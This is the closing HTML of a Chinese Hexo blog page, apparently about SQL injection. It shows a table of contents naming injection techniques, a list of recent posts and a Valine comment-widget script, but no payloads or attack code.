href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E5%88%A4%E6%96%AD"><span class="toc-number">2.0.1.</span> <span class="toc-text">注入点判断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Union%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">2.0.2.</span> <span class="toc-text">Union联合查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.0.3.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.0.4.</span> <span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8-%E5%9B%9E%E6%98%BE%E4%B8%8D%E5%90%8C"><span class="toc-number">2.0.4.1.</span> <span class="toc-text">一、布尔盲注 - 回显不同</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8-%E5%93%8D%E5%BA%94%E6%97%B6%E9%97%B4%E4%B8%8D%E5%90%8C"><span class="toc-number">2.0.4.2.</span> <span class="toc-text">二、时间盲注 - 响应时间不同</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">2.0.5.</span> <span class="toc-text">二次注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNSlog%E5%A4%96%E5%B8%A6%E6%B3%A8%E5%85%A5-%E5%8F%AA%E6%9C%89%E6%95%B0%E6%8D%AE%E5%BA%93%E9%83%A8%E7%BD%B2%E5%9C%A8win%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%8F%AF%E7%94%A8"><span class="toc-number">2.0.6.</span> <span class="toc-text">DNSlog外带注入(只有数据库部署在win环境下可用)</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/21/sqlmap/" title="sqlmap指令">sqlmap指令</a><time datetime="2025-02-21T10:23:12.431Z" title="发表于 2025-02-21 18:23:12">2025-02-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/21/SQL_injection/" title="SQL注入">SQL注入</a><time datetime="2025-02-21T10:23:12.430Z" title="发表于 2025-02-21 18:23:12">2025-02-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/21/SQL_founction/" title="SQL注入常用MySQL函数">SQL注入常用MySQL函数</a><time datetime="2025-02-21T10:23:12.428Z" title="发表于 2025-02-21 18:23:12">2025-02-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/21/Markdown/" title="Markdown">Markdown</a><time datetime="2025-02-21T10:23:12.426Z" title="发表于 2025-02-21 18:23:12">2025-02-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/21/Linux/" title="Linux操作命令">Linux操作命令</a><time datetime="2025-02-21T10:23:12.425Z" title="发表于 2025-02-21 18:23:12">2025-02-21</time></div></div></div></div></div></div></main><footer id="footer" style="background: falinear-gradient(20deg,#07f6ff,#ff2af2);"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By Vareca</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.3</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const initValine = (el, path) => {
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyValine = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+
+    const valineConfig = {
+      el: '#vcomment',
+      appId: 'pQqMYlTEhUMxZC4RkrZOiHVZ-gzGzoHsz',
+      appKey: 'd93RV6GMLwZaI4Lv2I8lz4Bl',
+      avatar: 'monsterid',
+      serverURLs: 'https://pqqmylte.lc-cn-n1-shared.com',
+      emojiMaps: "",
+      visitor: false,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || window.location.pathname
+    }
+
+    new Valine(valineConfig)
+  }
+
+  const loadValine = async (el, path) => {
+    if (typeof Valine === 'function') {
+      initValine(el, path)
+    } else {
+      await btf.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js')
+      initValine(el, path)
+    }
+  }
+
+  if (isShuoshuo) {
+    'Valine' === 'Valine'
+      ? window.shuoshuoComment = { loadComment: loadValine }
+      : window.loadOtherComment = loadValine
+    return
+  }
+
+  if ('Valine' === 'Valine' || !false) {
+    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+    else setTimeout(loadValine, 0)
+  } else {
+    window.loadOtherComment = loadValine
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
